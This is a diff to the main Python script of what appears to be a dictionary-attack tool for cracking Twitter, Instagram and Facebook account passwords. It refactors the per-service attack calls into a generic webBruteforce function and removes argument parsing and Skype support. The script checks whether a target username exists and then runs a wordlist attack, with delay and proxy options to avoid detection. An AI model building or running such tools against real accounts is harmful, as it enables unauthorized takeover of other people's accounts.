@@ -1,53 +1,8 @@
 #!/usr/bin/python
-from sys import *
-
-
-####################
-# Requirements and libraries. All stored in horrible seperate modules
-####################
-
-
-path.append('src/')
-from mainLib import *
-from facebookLib import *
-from instagramLib import *
-from twitterLib import *
-from header import *
-
-
-def get_args():
-
-    parser = argparse.ArgumentParser(description='Server-side bruteforce module written in Python')
-    required = parser.add_argument_group('required arguments')
-    required.add_argument('-s', '--service', dest='service', help="Provide a service being attacked. Several protocols and services are supported")
-    required.add_argument('-u', '--username', dest='username', help='Provide a valid username for service/protocol being executed')
-    required.add_argument('-w', '--wordlist', dest='password', help='Provide a wordlist or directory to a wordlist')
-    parser.add_argument('-a', '--address', dest='address', help='Provide host address for specified service. Required for certain protocols')
-    parser.add_argument('-p', '--port', type=int, dest='port', help='Provide port for host address for specified service. If not specified, will be automatically set')
-    parser.add_argument('-d', '--delay', type=int, dest='delay', help='Provide the number of seconds the program delays as each password is tried')
-    parser.add_argument('--proxy', dest='proxy', help="Providing a proxy for anonymization and avoiding time-outs")
-
-    args = parser.parse_args()
-
-    man_options = ['username', 'password']
-    for m in man_options:
-        if not args.__dict__[m]:
-            print R + "[!] You have to specify a username AND a wordlist! [!]" + W
-            exit()
-
-    service = args.service
-    username = args.username
-    wordlist = args.password
-    address = args.address
-    port = args.port
-    delay = args.delay
-    proxy = args.proxy
-
-    if delay is None:
-        delay = 1
-
-
-    return service, username, wordlist, address, port, delay, proxy
+from src.mainLib import *
+from src.header import *
+from core.protocols import *
+from core.web import *
 
 ####################
 # Main function. Append user args for visually appealing output
@@ -57,7 +12,7 @@ def main():
 
     service, username, wordlist, address, port, delay, proxy = get_args()
 
-    print headers[randint(0,13)]
+    print choice(headers)
 
     print (G + "[*] Username: %s " % username) + W
     sleep(0.5)
@@ -149,12 +104,12 @@ def main():
             print R + "[!] NOTE: You don't need to provide an address OR port for Twitter (LOL) [!]" + W
             exit()
         print P + "[*] Checking if username exists..." + W
-        if twitUserCheck(username) == 1:
+        if usercheck(username, service) == 1:
             print R + "[!] The username was not found! Exiting..." + W
             exit()
         print G + "[*] Username found! Continuing..." + W
         sleep(1)
-        twitterBruteforce(username, wordlist, delay)
+        webBruteforce(username, wordlist, service, delay)
 
     # Instagram Bruteforce
     elif service == 'instagram':
@@ -162,14 +117,14 @@ def main():
             print R + "[!] NOTE: You don't need to provide an address OR port for Instagram (LOL) [!]" + W
             exit()
         print P + "[*] Checking if username exists..." + W
-        if instUserCheck(username) == 1:
+        if usercheck(username, service) == 1:
             print R + "[!] The username was not found! Exiting..." + W
             exit()
         print G + "[*] Username found! Continuing..." + W
         sleep(1)
         print P + "[*] Starting dictionary attack! [*]" + W
         print "Using %s seconds of delay. Default is 1 second" % delay
-        instagramBruteforce(username, wordlist, delay)
+        webBruteforce(username, wordlist, service, delay)
 
     # Facebook Bruteforce
     elif service == 'facebook':
@@ -177,25 +132,14 @@ def main():
             print R + "[!] NOTE: You don't need to provide an address OR port for Facebook (LOL) [!]" + w
             exit()
         print P + "[*] Checking if username exists..." + W
-        if facebookCheck(username) == 1:
+        if usercheck(username, service) == 1:
             print R + "[!] The username was not found! Exiting..." + W
             exit()
         print G + "[*] Username found! Continuing..." + W
         sleep(1)
         print P + "[*] Starting dictionary attack! [*]" + W
         print "Using %s seconds of delay. Default is 1 second" % delay
-        facebookBruteforce(username, wordlist, delay)
-
-    # Skype Bruteforce
-    elif service == 'skype':
-        if address or port:
-            print R + "[!] NOTE: You don't need to provide an address OR port for Skype (LOL) [!]" + W
-        print P + "[*] Starting dictionary attack! [*]" + W
-        print "Using %s seconds of delay. Default is 1 second" % delay
-        skypeBruteforce(username, wordlist, delay)
-
-    
-
+        webBruteforce(username, wordlist, service, delay)
 
 
 if __name__ == '__main__':
